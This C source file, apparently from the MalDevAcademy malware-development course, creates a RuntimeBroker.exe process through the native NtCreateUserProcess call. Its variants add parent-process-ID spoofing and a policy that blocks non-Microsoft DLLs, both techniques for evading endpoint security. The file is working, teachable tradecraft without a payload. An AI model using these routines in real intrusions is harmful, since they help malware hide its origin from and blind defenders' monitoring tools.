// @NUL0x4C | @mrd0x : MalDevAcademy

#include <Windows.h>
#include <stdio.h>

#include "Structs.h"


#define TARGET_PROCESS		L"\\??\\C:\\Windows\\System32\\RuntimeBroker.exe"
#define PROCESS_PARMS		L"C:\\Windows\\System32\\RuntimeBroker.exe -Embedding"
#define PROCESS_PATH		L"C:\\Windows\\System32"

/*
					// Note that 'PS_ATTRIBUTE_LIST' structure looks like the following in 'Structs.h' line '198'

							typedef struct _PS_ATTRIBUTE_LIST
							{
								SIZE_T TotalLength;
								PS_ATTRIBUTE Attributes[1];

							} PS_ATTRIBUTE_LIST, * PPS_ATTRIBUTE_LIST;

					// So make sure to change it accordingly to what function your executing
*/



//\
https://github.com/winsiderss/systeminformer/blob/master/phnt/include/ntrtl.h#L2722

typedef NTSTATUS(NTAPI* fnRtlCreateProcessParametersEx)(

	PRTL_USER_PROCESS_PARAMETERS* pProcessParameters,
	PUNICODE_STRING					ImagePathName,
	PUNICODE_STRING					DllPath,
	PUNICODE_STRING					CurrentDirectory,
	PUNICODE_STRING					CommandLine,
	PVOID							Environment,
	PUNICODE_STRING					WindowTitle,
	PUNICODE_STRING					DesktopInfo,
	PUNICODE_STRING					ShellInfo,
	PUNICODE_STRING					RuntimeData,
	ULONG							Flags

	);


//\
https://github.com/winsiderss/systeminformer/blob/master/phnt/include/ntpsapi.h#L2288

typedef NTSTATUS(NTAPI* fnNtCreateUserProcess)(

	PHANDLE							ProcessHandle,
	PHANDLE							ThreadHandle,
	ACCESS_MASK						ProcessDesiredAccess,
	ACCESS_MASK						ThreadDesiredAccess,
	POBJECT_ATTRIBUTES				ProcessObjectAttributes,
	POBJECT_ATTRIBUTES				ThreadObjectAttributes,
	ULONG							ProcessFlags,
	ULONG							ThreadFlags,
	PRTL_USER_PROCESS_PARAMETERS	ProcessParameters,
	PPS_CREATE_INFO					CreateInfo,
	PPS_ATTRIBUTE_LIST				pAttributeList

	);




// Helper Function
VOID _RtlInitUnicodeString(OUT PUNICODE_STRING UsStruct, IN OPTIONAL PCWSTR Buffer) {

	if ((UsStruct->Buffer = (PWSTR)Buffer)) {

		unsigned int Length = wcslen(Buffer) * sizeof(WCHAR);
		if (Length > 0xfffc)
			Length = 0xfffc;

		UsStruct->Length = Length;
		UsStruct->MaximumLength = UsStruct->Length + sizeof(WCHAR);
	}

	else UsStruct->Length = UsStruct->MaximumLength = 0;
}



/*
typedef struct _PS_ATTRIBUTE_LIST
{
	SIZE_T TotalLength;
	PS_ATTRIBUTE Attributes[1];

} PS_ATTRIBUTE_LIST, * PPS_ATTRIBUTE_LIST;
*/
BOOL NtCreateUserProcessMinimalPoC(
	IN	PWSTR	szTargetProcess,
	IN	PWSTR	szTargetProcessParameters,
	IN	PWSTR	szTargetProcessPath,
	OUT PHANDLE hProcess,
	OUT PHANDLE hThread
) {

	// getting the address of 'RtlCreateProcessParametersEx' and 'NtCreateUserProcess' from ntdll.dll
	fnRtlCreateProcessParametersEx	RtlCreateProcessParametersEx = (fnRtlCreateProcessParametersEx)GetProcAddress(GetModuleHandle(L"NTDLL"), "RtlCreateProcessParametersEx");
	fnNtCreateUserProcess			NtCreateUserProcess = (fnNtCreateUserProcess)GetProcAddress(GetModuleHandle(L"NTDLL"), "NtCreateUserProcess");

	if (NtCreateUserProcess == NULL || RtlCreateProcessParametersEx == NULL)
		return FALSE;

	NTSTATUS						STATUS					= NULL;
	UNICODE_STRING					UsNtImagePath			= { 0 },
									UsCommandLine			= { 0 },
									UsCurrentDirectory		= { 0 };
	PRTL_USER_PROCESS_PARAMETERS	UppProcessParameters	= NULL;
	// allocating a buffer to hold the value of the attribute lists
	PPS_ATTRIBUTE_LIST				pAttributeList = (PPS_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PS_ATTRIBUTE_LIST));
	if (!pAttributeList)
		return FALSE;

	// initializing the 'UNICODE_STRING' structures with the inputted paths
	_RtlInitUnicodeString(&UsNtImagePath, szTargetProcess);
	_RtlInitUnicodeString(&UsCommandLine, szTargetProcessParameters);
	_RtlInitUnicodeString(&UsCurrentDirectory, szTargetProcessPath);

	// calling 'RtlCreateProcessParametersEx' to intialize a 'PRTL_USER_PROCESS_PARAMETERS' structure for 'NtCreateUserProcess' 
	STATUS = RtlCreateProcessParametersEx(&UppProcessParameters, &UsNtImagePath, NULL, &UsCurrentDirectory, &UsCommandLine, NULL, NULL, NULL, NULL, NULL, RTL_USER_PROC_PARAMS_NORMALIZED);
	if (STATUS != STATUS_SUCCESS) {
		printf("[!] RtlCreateProcessParametersEx Failed With Error : 0x%0.8X \n", STATUS);
		goto _EndOfFunc;
	}

	// setting the length of the attribute list
	pAttributeList->TotalLength = sizeof(PS_ATTRIBUTE_LIST);

	// intializing an attribute list of type 'PS_ATTRIBUTE_IMAGE_NAME' that specifies the image's path
	pAttributeList->Attributes[0].Attribute = PS_ATTRIBUTE_IMAGE_NAME;
	pAttributeList->Attributes[0].Size		= UsNtImagePath.Length;
	pAttributeList->Attributes[0].Value		= (ULONG_PTR)UsNtImagePath.Buffer;

	// creating the 'PS_CREATE_INFO' structure, that will almost always look like this
	PS_CREATE_INFO				psCreateInfo = {
											.Size = sizeof(PS_CREATE_INFO),
											.State = PsCreateInitialState
	};

	// creating the process
	// hProcess and hThread are already pointers
	STATUS = NtCreateUserProcess(hProcess, hThread, PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS, NULL, NULL, NULL, NULL, UppProcessParameters, &psCreateInfo, pAttributeList);
	if (STATUS != STATUS_SUCCESS) {
		printf("[!] NtCreateUserProcess Failed With Error : 0x%0.8X \n", STATUS);
		goto _EndOfFunc;
	}

_EndOfFunc:
	HeapFree(GetProcessHeap(), 0, pAttributeList);
	if (*hProcess == NULL || *hThread == NULL)
		return FALSE;
	else
		return TRUE;
}




/*
typedef struct _PS_ATTRIBUTE_LIST
{
	SIZE_T TotalLength;
	PS_ATTRIBUTE Attributes[2];

} PS_ATTRIBUTE_LIST, * PPS_ATTRIBUTE_LIST;
*/
BOOL NtCreateUserProcessForPPidSpoofing(
	IN	PWSTR	szTargetProcess,
	IN	PWSTR	szTargetProcessParameters,
	IN	PWSTR	szTargetProcessPath,
	IN	HANDLE	hParentProcess,
	OUT PHANDLE hProcess,
	OUT PHANDLE hThread
) {

	// getting the address of 'RtlCreateProcessParametersEx' and 'NtCreateUserProcess' from ntdll.dll
	fnRtlCreateProcessParametersEx	RtlCreateProcessParametersEx	= (fnRtlCreateProcessParametersEx)GetProcAddress(GetModuleHandle(L"NTDLL"), "RtlCreateProcessParametersEx");
	fnNtCreateUserProcess			NtCreateUserProcess				= (fnNtCreateUserProcess)GetProcAddress(GetModuleHandle(L"NTDLL"), "NtCreateUserProcess");
	
	if (NtCreateUserProcess == NULL || RtlCreateProcessParametersEx == NULL) 
		return FALSE;

	NTSTATUS						STATUS					= NULL;
	UNICODE_STRING					UsNtImagePath			= { 0 },
									UsCommandLine			= { 0 },
									UsCurrentDirectory		= { 0 };
	PRTL_USER_PROCESS_PARAMETERS	UppProcessParameters	= NULL;
	// allocating a buffer to hold the value of the attribute lists
	PPS_ATTRIBUTE_LIST				pAttributeList			= (PPS_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PS_ATTRIBUTE_LIST));
	if (!pAttributeList)
		return FALSE;
	
	// initializing the 'UNICODE_STRING' structures with the inputted paths
	_RtlInitUnicodeString(&UsNtImagePath, szTargetProcess);
	_RtlInitUnicodeString(&UsCommandLine, szTargetProcessParameters);
	_RtlInitUnicodeString(&UsCurrentDirectory, szTargetProcessPath);

	// calling 'RtlCreateProcessParametersEx' to intialize a 'PRTL_USER_PROCESS_PARAMETERS' structure for 'NtCreateUserProcess' 
	STATUS = RtlCreateProcessParametersEx(&UppProcessParameters, &UsNtImagePath, NULL, &UsCurrentDirectory, &UsCommandLine, NULL, NULL, NULL, NULL, NULL, RTL_USER_PROC_PARAMS_NORMALIZED);
	if (STATUS != STATUS_SUCCESS) {
		printf("[!] RtlCreateProcessParametersEx Failed With Error : 0x%0.8X \n", STATUS);
		goto _EndOfFunc;
	}

	// setting the length of the attribute list
	pAttributeList->TotalLength				= sizeof(PS_ATTRIBUTE_LIST);
	
	// intializing an attribute list of type 'PS_ATTRIBUTE_IMAGE_NAME' that specifies the image's path
	pAttributeList->Attributes[0].Attribute	= PS_ATTRIBUTE_IMAGE_NAME;
	pAttributeList->Attributes[0].Size		= UsNtImagePath.Length;
	pAttributeList->Attributes[0].Value		= (ULONG_PTR)UsNtImagePath.Buffer;

	// intializing an attribute list of type 'PS_ATTRIBUTE_PARENT_PROCESS' that specifies the process's parent
	pAttributeList->Attributes[1].Attribute	= PS_ATTRIBUTE_PARENT_PROCESS;
	pAttributeList->Attributes[1].Size		= sizeof(HANDLE);
	pAttributeList->Attributes[1].Value		= hParentProcess;

	// creating the 'PS_CREATE_INFO' structure, that will almost always look like this
	PS_CREATE_INFO				psCreateInfo = {
											.Size	= sizeof(PS_CREATE_INFO),
											.State	= PsCreateInitialState
	};
	
	// creating the process
	// hProcess and hThread are already pointers
	STATUS = NtCreateUserProcess(hProcess, hThread, PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS, NULL, NULL, NULL, NULL, UppProcessParameters, &psCreateInfo, pAttributeList);
	if (STATUS != STATUS_SUCCESS) {
		printf("[!] NtCreateUserProcess Failed With Error : 0x%0.8X \n", STATUS);
		goto _EndOfFunc;
	}


_EndOfFunc:
	HeapFree(GetProcessHeap(), 0, pAttributeList);
	if (*hProcess == NULL || *hThread == NULL)
		return FALSE;
	else
		return TRUE;
}




/*
typedef struct _PS_ATTRIBUTE_LIST
{
	SIZE_T TotalLength;
	PS_ATTRIBUTE Attributes[2];

} PS_ATTRIBUTE_LIST, * PPS_ATTRIBUTE_LIST;
*/
BOOL NtCreateUserProcessForBlockDllPolicy(
	IN	PWSTR	szTargetProcess,
	IN	PWSTR	szTargetProcessParameters,
	IN	PWSTR	szTargetProcessPath,
	OUT PHANDLE hProcess,
	OUT PHANDLE hThread
) {

	// getting the address of 'RtlCreateProcessParametersEx' and 'NtCreateUserProcess' from ntdll.dll
	fnRtlCreateProcessParametersEx	RtlCreateProcessParametersEx	= (fnRtlCreateProcessParametersEx)GetProcAddress(GetModuleHandle(L"NTDLL"), "RtlCreateProcessParametersEx");
	fnNtCreateUserProcess			NtCreateUserProcess				= (fnNtCreateUserProcess)GetProcAddress(GetModuleHandle(L"NTDLL"), "NtCreateUserProcess");

	if (NtCreateUserProcess == NULL || RtlCreateProcessParametersEx == NULL)
		return FALSE;

	NTSTATUS						STATUS					= NULL;
	UNICODE_STRING					UsNtImagePath			= { 0 },
									UsCommandLine			= { 0 },
									UsCurrentDirectory		= { 0 };
	PRTL_USER_PROCESS_PARAMETERS	UppProcessParameters	= NULL;
	// the mitigation policy flag (attribute value)
	DWORD64							dwBlockDllPolicy		= PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
	// allocating a buffer to hold the value of the attribute lists
	PPS_ATTRIBUTE_LIST				pAttributeList			= (PPS_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PS_ATTRIBUTE_LIST));
	if (!pAttributeList)
		return FALSE;

	// initializing the 'UNICODE_STRING' structures with the inputted paths
	_RtlInitUnicodeString(&UsNtImagePath, szTargetProcess);
	_RtlInitUnicodeString(&UsCommandLine, szTargetProcessParameters);
	_RtlInitUnicodeString(&UsCurrentDirectory, szTargetProcessPath);

	// calling 'RtlCreateProcessParametersEx' to intialize a 'PRTL_USER_PROCESS_PARAMETERS' structure for 'NtCreateUserProcess' 
	STATUS = RtlCreateProcessParametersEx(&UppProcessParameters, &UsNtImagePath, NULL, &UsCurrentDirectory, &UsCommandLine, NULL, NULL, NULL, NULL, NULL, RTL_USER_PROC_PARAMS_NORMALIZED);
	if (STATUS != STATUS_SUCCESS) {
		printf("[!] RtlCreateProcessParametersEx Failed With Error : 0x%0.8X \n", STATUS);
		goto _EndOfFunc;
	}

	// setting the length of the attribute list
	pAttributeList->TotalLength					= sizeof(PS_ATTRIBUTE_LIST);

	// intializing an attribute list of type 'PS_ATTRIBUTE_IMAGE_NAME' that specifies the image's path
	pAttributeList->Attributes[0].Attribute		= PS_ATTRIBUTE_IMAGE_NAME;
	pAttributeList->Attributes[0].Size			= UsNtImagePath.Length;
	pAttributeList->Attributes[0].Value			= (ULONG_PTR)UsNtImagePath.Buffer;

	// intializing an attribute list of type 'PS_ATTRIBUTE_MITIGATION_OPTIONS' that specifies the use of process's mitigation policies
	pAttributeList->Attributes[1].Attribute		= PS_ATTRIBUTE_MITIGATION_OPTIONS;
	pAttributeList->Attributes[1].Size			= sizeof(DWORD64);
	pAttributeList->Attributes[1].Value			= &dwBlockDllPolicy;

	// creating the 'PS_CREATE_INFO' structure, that will almost always look like this
	PS_CREATE_INFO					psCreateInfo = {
												.Size = sizeof(PS_CREATE_INFO),
												.State = PsCreateInitialState
	};


	// creating the process
	// hProcess and hThread are already pointers
	STATUS = NtCreateUserProcess(hProcess, hThread, PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS, NULL, NULL, NULL, NULL, UppProcessParameters, &psCreateInfo, pAttributeList);
	if (STATUS != STATUS_SUCCESS) {
		printf("[!] NtCreateUserProcess Failed With Error : 0x%0.8X \n", STATUS);
		goto _EndOfFunc;
	}


_EndOfFunc:
	HeapFree(GetProcessHeap(), 0, pAttributeList);
	if (*hProcess == NULL || *hThread == NULL)
		return FALSE;
	else
		return TRUE;
}




/*
typedef struct _PS_ATTRIBUTE_LIST
{
	SIZE_T TotalLength;
	PS_ATTRIBUTE Attributes[3];

} PS_ATTRIBUTE_LIST, * PPS_ATTRIBUTE_LIST;
*/
BOOL NtCreateUserProcessForBoth(
	IN	PWSTR	szTargetProcess,
	IN	PWSTR	szTargetProcessParameters,
	IN	PWSTR	szTargetProcessPath,
	IN	HANDLE	hParentProcess,
	OUT PHANDLE hProcess,
	OUT PHANDLE hThread
) {
		
	// getting the address of 'RtlCreateProcessParametersEx' and 'NtCreateUserProcess' from ntdll.dll
	fnRtlCreateProcessParametersEx	RtlCreateProcessParametersEx	= (fnRtlCreateProcessParametersEx)GetProcAddress(GetModuleHandle(L"NTDLL"), "RtlCreateProcessParametersEx");
	fnNtCreateUserProcess			NtCreateUserProcess				= (fnNtCreateUserProcess)GetProcAddress(GetModuleHandle(L"NTDLL"), "NtCreateUserProcess");

	if (NtCreateUserProcess == NULL || RtlCreateProcessParametersEx == NULL)
		return FALSE;

	NTSTATUS						STATUS					= NULL;
	UNICODE_STRING					UsNtImagePath			= { 0 },
									UsCommandLine			= { 0 },
									UsCurrentDirectory		= { 0 };
	PRTL_USER_PROCESS_PARAMETERS	UppProcessParameters	= NULL;
	// the mitigation policy flag (attribute value)
	DWORD64							dwBlockDllPolicy		= PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
	PPS_ATTRIBUTE_LIST				pAttributeList			= (PPS_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PS_ATTRIBUTE_LIST));
	if (!pAttributeList)
		return FALSE;

	// initializing the 'UNICODE_STRING' structures with the inputted paths
	_RtlInitUnicodeString(&UsNtImagePath, szTargetProcess);
	_RtlInitUnicodeString(&UsCommandLine, szTargetProcessParameters);
	_RtlInitUnicodeString(&UsCurrentDirectory, szTargetProcessPath);

	// calling 'RtlCreateProcessParametersEx' to intialize a 'PRTL_USER_PROCESS_PARAMETERS' structure for 'NtCreateUserProcess' 
	STATUS = RtlCreateProcessParametersEx(&UppProcessParameters, &UsNtImagePath, NULL, &UsCurrentDirectory, &UsCommandLine, NULL, NULL, NULL, NULL, NULL, RTL_USER_PROC_PARAMS_NORMALIZED);
	if (STATUS != STATUS_SUCCESS) {
		printf("[!] RtlCreateProcessParametersEx Failed With Error : 0x%0.8X \n", STATUS);
		goto _EndOfFunc;
	}


	// setting the length of the attribute list
	pAttributeList->TotalLength					= sizeof(PS_ATTRIBUTE_LIST);

	// intializing an attribute list of type 'PS_ATTRIBUTE_IMAGE_NAME' that specifies the image's path
	pAttributeList->Attributes[0].Attribute		= PS_ATTRIBUTE_IMAGE_NAME;
	pAttributeList->Attributes[0].Size			= UsNtImagePath.Length;
	pAttributeList->Attributes[0].Value			= (ULONG_PTR)UsNtImagePath.Buffer;

	// intializing an attribute list of type 'PS_ATTRIBUTE_MITIGATION_OPTIONS' that specifies the use of process's mitigation policies
	pAttributeList->Attributes[1].Attribute		= PS_ATTRIBUTE_MITIGATION_OPTIONS;
	pAttributeList->Attributes[1].Size			= sizeof(DWORD64);
	pAttributeList->Attributes[1].Value			= &dwBlockDllPolicy;

	// intializing an attribute list of type 'PS_ATTRIBUTE_PARENT_PROCESS' that specifies the process's parent
	pAttributeList->Attributes[2].Attribute		= PS_ATTRIBUTE_PARENT_PROCESS;
	pAttributeList->Attributes[2].Size			= sizeof(HANDLE);
	pAttributeList->Attributes[2].Value			= hParentProcess;

	// creating the 'PS_CREATE_INFO' structure, that will almost always look like this
	PS_CREATE_INFO				psCreateInfo	= {
											.Size = sizeof(PS_CREATE_INFO),
											.State = PsCreateInitialState
	};

	// creating the process
	// hProcess and hThread are already pointers
	STATUS = NtCreateUserProcess(hProcess, hThread, PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS, NULL, NULL, NULL, NULL, UppProcessParameters, &psCreateInfo, pAttributeList);
	if (STATUS != STATUS_SUCCESS) {
		printf("[!] NtCreateUserProcess Failed With Error : 0x%0.8X \n", STATUS);
		goto _EndOfFunc;
	}


_EndOfFunc:
	HeapFree(GetProcessHeap(), 0, pAttributeList);
	if (*hProcess == NULL || *hThread == NULL)
		return FALSE;
	else
		return TRUE;
}




#define PARENT_PID 4384

//\
#define PPID_SPOOFING
//\
#define BLOCKDLL_POLICY
//\
#define BOTH



int main() {

	HANDLE	hParentProcess	= NULL,
			hProcess		= NULL,
			hThread			= NULL;


	if (!NtCreateUserProcessMinimalPoC(TARGET_PROCESS, PROCESS_PARMS, PROCESS_PATH, &hProcess, &hThread))
		return -1;
	printf("[+] Target Process Created With Pid : %d \n", GetProcessId(hProcess));
	printf("[+] Process's Main Thread Created With Tid : %d \n", GetThreadId(hThread));

//--------------------------------------------------------------------------------------------------------------------------------------------------

#ifdef PPID_SPOOFING
	hParentProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PARENT_PID);
	if (!NtCreateUserProcessForPPidSpoofing(TARGET_PROCESS, PROCESS_PARMS, PROCESS_PATH, hParentProcess, &hProcess, &hThread))
		return -1;
	printf("[+] Target Process Created With Pid : %d \n", GetProcessId(hProcess));
	printf("[+] Process's Main Thread Created With Tid : %d \n", GetThreadId(hThread));
#endif // PPID_SPOOFING

//--------------------------------------------------------------------------------------------------------------------------------------------------

#ifdef BLOCKDLL_POLICY
	if (!NtCreateUserProcessForBlockDllPolicy(TARGET_PROCESS, PROCESS_PARMS, PROCESS_PATH, &hProcess, &hThread))
		return -1;
	printf("[+] Target Process Created With Pid : %d \n", GetProcessId(hProcess));
	printf("[+] Process's Main Thread Created With Tid : %d \n", GetThreadId(hThread));
#endif // BLOCKDLL_POLICY

//--------------------------------------------------------------------------------------------------------------------------------------------------

#ifdef BOTH
	hParentProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PARENT_PID);
	if (!NtCreateUserProcessForBoth(TARGET_PROCESS, PROCESS_PARMS, PROCESS_PATH, hParentProcess, &hProcess, &hThread))
		return -1;

	printf("[+] Target Process Created With Pid : %d \n", GetProcessId(hProcess));
	printf("[+] Process's Main Thread Created With Tid : %d \n", GetThreadId(hThread));
#endif // BOTH


	printf("[#] Press <Enter> To Quit ... ");
	getchar();

	return 0;
}


